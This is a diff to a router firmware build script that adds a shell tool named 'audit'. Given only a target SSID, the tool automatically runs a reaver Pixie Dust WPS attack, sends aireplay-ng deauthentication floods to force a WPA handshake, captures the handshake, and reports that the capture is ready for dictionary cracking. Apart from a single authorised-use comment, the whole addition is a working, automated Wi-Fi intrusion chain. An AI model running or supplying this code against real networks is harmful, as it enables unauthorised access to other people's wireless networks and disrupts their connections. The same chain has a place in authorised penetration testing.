@@ -373,3 +373,130 @@ for f in "$SRC/files/usr/bin/audit-air" "$SRC/files/usr/bin/audit-hcx" "$SRC/fil
 	if sh -n "$f"; then echo "ok $(basename $f)"; else echo "!! 语法错误 $(basename $f)"; fi
 done
 echo "==> 完成"
+# ---------- 10. 一条龙审计：audit（只给 SSID） ----------
+cat > "$SRC/files/usr/bin/audit" << 'AUDIT_EOF'
+#!/bin/sh
+# audit —— 连乐2 审计一条龙：只给目标 SSID，其余全自动
+# 用法：audit 目标SSID [抓包秒数]
+#   例：audit CU_r2CU
+#       audit CU_r2CU 180
+# 流程：关无线 → 建 monitor → 扫目标 → 仙尘(WPS) → 诱发握手+抓包 → 校验握手 → 生成网页报告 → 恢复无线
+# 仅用于自己/已授权的网络。
+
+TAG="$1"
+W="${2:-120}"
+PWT="${PWT:-60}"
+OUT=/www/audit
+FIN=/root/audit-out
+mkdir -p "$OUT" "$FIN"
+rm -f "$OUT"/cap-*.cap "$OUT"/*.log >/dev/null 2>&1
+
+say() { echo "[*] $*"; }
+die() { echo "ABORT$1 $2"; finish; exit "$1"; }
+
+finish() {
+	[ -n "$MON" ] && { iw dev "$MON" del >/dev/null 2>&1; MON=""; }
+	[ -n "$AID" ] && kill "$AID" >/dev/null 2>&1
+	wifi up >/dev/null 2>&1
+	{ echo "=== 报告 ==="
+	  echo "目标: ${TAG:-未提供}"
+	  echo "时间: $(date '+%Y-%m-%d %H:%M:%S')"
+	  echo "BSSID: ${BSS:-未锁定}  信道: ${CH:-?}"
+	  echo "仙尘: ${PIXIE_RESULT:-未执行}"
+	  echo "握手: ${HS_RESULT:-未执行}"
+	  [ -n "$CAPFILE" ] && echo "抓包: $(basename "$CAPFILE")"
+	} > "$OUT/summary.txt"
+	{
+	  echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
+	  echo '<title>连乐2 审计报告</title><style>body{margin:0;padding:12px;background:#0f1216;color:#dfe7ef;font:13px/1.6 monospace}h1{color:#6ad}h2{color:#fc6;border-bottom:1px solid #333;padding-top:14px}pre{white-space:pre-wrap;word-break:break-all;background:#151a20;padding:8px;border-radius:6px}</style></head><body>'
+	  echo "<h1>连乐2 审计报告</h1><h2>结论</h2><pre>$(cat "$OUT/summary.txt" 2>/dev/null)</pre>"
+	  for f in pixie.log airodump.log aircrack.log; do
+		[ -f "$OUT/$f" ] && echo "<h2>$f</h2><pre>$(sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g' "$OUT/$f" | tail -n 40)</pre>"
+	  done
+	  echo "<h2>可下载</h2><p><a style='color:#6ad' href='/audit/'>/audit/</a> 目录里有 cap 文件</p>"
+	  echo '</body></html>'
+	} > "$OUT/index.html"
+}
+
+# ---------- 前置检查 ----------
+[ -n "$TAG" ] || { echo "用法: audit <目标SSID> [秒数]"; echo "例: audit CU_r2CU"; exit 1; }
+for b in iw airodump-ng aireplay-ng aircrack-ng reaver; do
+	command -v "$b" >/dev/null 2>&1 || die 10 "缺 $b（固件没带这个工具）"
+done
+PHY=$(iw phy 2>/dev/null | awk '/^Wiphy phy/{print $2; exit}')
+[ -n "$PHY" ] || die 13 "找不到无线 phy（ath9k 没起来）"
+say "目标=$TAG  phy=$PHY  抓包=${W}s"
+
+# ---------- 建 monitor ----------
+wifi down >/dev/null 2>&1; sleep 2
+iw dev mon0 del >/dev/null 2>&1
+MON=mon0
+iw phy "$PHY" interface add "$MON" type monitor >/dev/null 2>&1 || die 19 "monitor 建不起来"
+ip link set "$MON" up >/dev/null 2>&1 || die 19 "monitor 拉不起来"
+say "monitor 就绪"
+
+# ---------- 扫目标 ----------
+say "扫描中（约 10 秒）…"
+iw dev "$MON" scan > "$OUT/scan.txt" 2>/dev/null
+LINE=$(grep -n "SSID: $TAG$" "$OUT/scan.txt" | head -1 | cut -d: -f1)
+[ -n "$LINE" ] || die 16 "扫不到 $TAG，换位置或确认真名"
+BSS=$(sed -n "1,${LINE}p" "$OUT/scan.txt" | grep -oE "BSS [0-9a-f:]{17}" | tail -1 | awk '{print $2}')
+FREQ=$(sed -n "${LINE},$((LINE+25))p" "$OUT/scan.txt" | grep -oE "freq: [0-9]+" | head -1 | awk '{print $2}')
+case ${FREQ:-2437} in
+	2412) CH=1;; 2417) CH=2;; 2422) CH=3;; 2427) CH=4;; 2432) CH=5;;
+	2437) CH=6;; 2442) CH=7;; 2447) CH=8;; 2452) CH=9;; 2457) CH=10;;
+	2462) CH=11;; 2467) CH=12;; 2472) CH=13;; *) CH=6;;
+esac
+[ -n "$BSS" ] || die 16 "扫到了 $TAG 但没解析出 BSSID"
+say "锁定 BSSID=$BSS 信道=$CH"
+iw dev "$MON" set channel "$CH" >/dev/null 2>&1
+
+# ---------- 第一步：仙尘 ----------
+say "仙尘尝试（最多 ${PWT}s）…"
+timeout "$PWT" reaver -i "$MON" -b "$BSS" -K 1 -N -vv > "$OUT/pixie.log" 2>&1
+if grep -qiE "PIN: |WPS PIN|PASSWORD|passphrase" "$OUT/pixie.log"; then
+	PIXIE_RESULT="成功（见 pixie.log）"
+elif grep -qiE "WPS" "$OUT/pixie.log"; then
+	PIXIE_RESULT="目标开了 WPS 但本轮没出（可加大 PWT 重试）"
+else
+	PIXIE_RESULT="目标未开 WPS 或无响应"
+fi
+say "仙尘：$PIXIE_RESULT"
+
+# ---------- 第二步：诱发握手 + 抓包 ----------
+say "抓取握手（${W}s，含 deauth 诱发）…"
+airodump-ng --bssid "$BSS" --channel "$CH" -w "$OUT/cap" "$MON" > "$OUT/airodump.log" 2>&1 &
+AID=$!
+i=0
+while [ "$i" -lt 3 ]; do
+	sleep 6
+	aireplay-ng --deauth 4 -a "$BSS" -i "$MON" >/dev/null 2>&1
+	i=$((i+1))
+done
+sleep $((W > 18 ? W - 18 : 0))
+kill "$AID" >/dev/null 2>&1; AID=""; sleep 1
+CAPFILE=$(ls -t "$OUT"/cap-*.cap 2>/dev/null | head -1)
+[ -n "$CAPFILE" ] || die 20 "没抓到任何包"
+HS_RESULT=$(aircrack-ng "$CAPFILE" 2>&1 | grep -E "WPA \([1-9]" | head -1)
+if [ -n "$HS_RESULT" ]; then
+	HS_RESULT="已抓到握手 → $HS_RESULT（拿去跑字典即可）"
+else
+	HS_RESULT="未抓到握手（目标当时无客户端关联，或距离太远）"
+fi
+aircrack-ng "$CAPFILE" > "$OUT/aircrack.log" 2>&1
+say "握手：$HS_RESULT"
+
+# 复制成品到持久目录
+cp -f "$OUT"/cap-*.cap "$FIN"/ 2>/dev/null
+cp -f "$OUT"/scan.txt "$FIN"/ 2>/dev/null
+
+finish
+say "完成。报告：http://192.168.2.1/audit/"
+say "抓包文件也在 /root/audit-out/"
+AUDIT_EOF
+chmod +x "$SRC/files/usr/bin/audit"
+
+# audit-air / audit-hcx 也支持直接跟 SSID
+for f in audit-air audit-hcx; do
+	[ -f "$SRC/files/usr/bin/$f" ] && sed -i 's|TAG="${TAG:?ABORT01 需要 TAG=目标SSID}"|TAG="${1:-$TAG}"; [ -n "$TAG" ] || { echo "ABORT01 用法: '$f' <SSID>"; exit 1; }|' "$SRC/files/usr/bin/$f"
+done
